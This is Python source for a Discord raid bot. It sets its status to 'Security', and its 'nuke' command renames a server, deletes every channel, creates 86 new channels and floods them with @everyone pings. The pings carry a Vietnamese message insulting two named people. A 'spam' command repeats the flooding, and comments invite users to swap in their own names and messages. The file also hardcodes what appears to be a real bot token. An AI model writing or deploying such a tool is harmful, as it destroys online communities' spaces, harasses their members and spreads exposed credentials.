import discord
from discord.ext import commands, tasks
import os
import asyncio

prefix='!'
n=0

intents=discord.Intents.default()
intents = discord.Intents(messages=True, guilds=True)




client = commands.Bot(command_prefix=prefix, intents=intents)
@client.event
async def on_ready():
    print('Bot is online')
    await client.change_presence(activity=discord.Game('Security'))

@client.command()
async def ping(ctx):
    await ctx.send(f'Pong! {round(client.latency * 1000)}ms')

@client.command
async def invite(ctx):
  await ctx.reply('')

@client.command()
async def nuke(ctx):

    await ctx.guild.edit(name='Hoàng Và Sơn Thiểu Năng Nên Server Bị Raid :smirk:') #Decide what to change the server name to

    for c in ctx.guild.channels:
        await c.delete()

    guild = ctx.message.guild

    n=0
    while(n<=85):
        await guild.create_text_channel('Hoàng Và Sơn Thiểu Năng Nên Server Bị Raid :smirk:') # Decide what should be the name of the text channels that you will create
        n = n+1

    for c in ctx.guild.text_channels:
             await c.send('@everyone Hoàng Và Sơn Thiểu Năng Nên Server Bị Raid :smirk:') # Put the messages you want to be spammed here
             await c.send('@everyone Hoàng Và Sơn Thiểu Năng Nên Server Bị Raid :smirk:')
             await c.send('@everyone Hoàng Và Sơn Thiểu Năng Nên Server Bị Raid :smirk:')
             await c.send('@everyone Hoàng Và Sơn Thiểu Năng Nên Server Bị Raid :smirk:')
             await c.send('@everyone Hoàng Và Sơn Thiểu Năng Nên Server Bị Raid :smirk:')

@client.command()
async def spam(ctx):
    for c in ctx.guild.text_channels:
             await c.send('@everyone Hoàng Và Sơn Thiểu Năng Nên Server Bị Raid :smirk:') #Put what to be spammed in the brackets 
             await c.send('@everyone Hoàng Và Sơn Thiểu Năng Nên Server Bị Raid :smirk:')
             await c.send('@everyone Hoàng Và Sơn Thiểu Năng Nên Server Bị Raid :smirk:')
             await c.send('@everyone Hoàng Và Sơn Thiểu Năng Nên Server Bị Raid :smirk:')
             await c.send('@everyone Hoàng Và Sơn Thiểu Năng Nên Server Bị Raid :smirk:')

client.run('OTA3ODgxMTgxNzM4MDQ1NDcx.YYtoPQ.mN8RUP_XrhUDjCng4jfU-vKvv7I')
